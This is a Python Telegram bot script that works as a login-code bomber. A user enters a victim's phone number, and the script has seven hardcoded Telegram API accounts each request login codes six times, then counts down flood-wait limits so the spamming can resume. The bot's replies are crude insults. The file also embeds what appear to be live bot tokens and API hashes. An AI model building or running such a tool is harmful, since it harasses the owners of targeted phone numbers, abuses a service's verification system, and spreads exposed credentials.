import asyncio
import re
from telethon import TelegramClient, errors
from aiogram import Bot, Dispatcher, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command
from aiogram import F

TOKEN = "8978420835:AAHBaPWP0IGX4YHw1qawpE7nCoRXaK4Kxc4"
ACCOUNTS = [
    {"api_id": 33788912, "api_hash": "175c63ac822b43d48b32776ee6b82761"},
    {"api_id": 33590106, "api_hash": "b40ac10586c1d243b6180c7f9a4feff2"},
    {"api_id": 39934985, "api_hash": "d0ff8b0d846856b0a01a99379b96e9bd"},
    {"api_id": 7216741, "api_hash": "1e85ff32d1cabb4e6e9537ae2d8218ca"},
    {"api_id": 31360840, "api_hash": "4279cc0d7ab41331200a13bf61152f4a"},
    {"api_id": 867055023716, "api_hash": "11dafcdc1514796c867055023716d39a"},
    {"api_id": 38299331, "api_hash": "fb5e560c3bda2db7541770b2294ee137"}
]

bot = Bot(token=TOKEN)
dp = Dispatcher()
user_states = {}
clients = []

async def on_startup():
    for acc in ACCOUNTS:
        client = TelegramClient(None, acc["api_id"], acc["api_hash"])
        await client.start()
        clients.append(client)

async def on_shutdown():
    for c in clients:
        await c.disconnect()

def clean_phone(phone):
    phone = re.sub(r'[^0-9+]', '', phone)
    if not phone.startswith('+'):
        phone = '+' + phone
    return phone

async def finish_flood(chat_id, msg_id):
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="spam", callback_data="spam")]])
    await bot.edit_message_text("floodwait zakonchen mochesh dalshe spamit", chat_id, msg_id, reply_markup=kb)
    if chat_id in user_states:
        user_states[chat_id]["timer_task"] = None

async def flood_timer(chat_id, msg_id, seconds):
    remaining = seconds
    while remaining > 0:
        await bot.edit_message_text(f"floodwait - {remaining}sekund", chat_id, msg_id)
        await asyncio.sleep(1)
        remaining -= 1
    await finish_flood(chat_id, msg_id)

async def send_codes(chat_id, msg_id, phone):
    max_flood = 0
    for client in clients:
        for _ in range(6):
            try:
                await client.send_code_request(phone)
            except errors.FloodWaitError as e:
                if e.seconds > max_flood:
                    max_flood = e.seconds
            except:
                pass
    await bot.edit_message_text("gotovo tvoia mat viebana", chat_id, msg_id)
    if max_flood > 0:
        task = asyncio.create_task(flood_timer(chat_id, msg_id, max_flood))
        if chat_id in user_states:
            user_states[chat_id]["timer_task"] = task
    else:
        await finish_flood(chat_id, msg_id)

@dp.message(Command("start"))
async def cmd_start(msg: types.Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="spam", callback_data="spam")]])
    sent = await msg.answer("privet ueban chtob spamit nashmi vnizu (spam)", reply_markup=kb)
    user_states[msg.chat.id] = {"message_id": sent.message_id, "timer_task": None, "waiting_phone": False}

@dp.callback_query(F.data == "spam")
async def callback_spam(call: types.CallbackQuery):
    chat_id = call.message.chat.id
    state = user_states.get(chat_id)
    if not state:
        await call.answer()
        return
    if state.get("timer_task"):
        state["timer_task"].cancel()
        state["timer_task"] = None
    await bot.edit_message_text("napishi nomer", chat_id, state["message_id"])
    state["waiting_phone"] = True
    await call.answer()

@dp.message(F.text)
async def handle_phone(msg: types.Message):
    chat_id = msg.chat.id
    state = user_states.get(chat_id)
    if not state or not state.get("waiting_phone"):
        return
    phone = clean_phone(msg.text)
    state["waiting_phone"] = False
    await bot.delete_message(chat_id, msg.message_id)
    await send_codes(chat_id, state["message_id"], phone)

async def main():
    await on_startup()
    try:
        await dp.start_polling(bot)
    finally:
        await on_shutdown()

if __name__ == "__main__":
    asyncio.run(main())
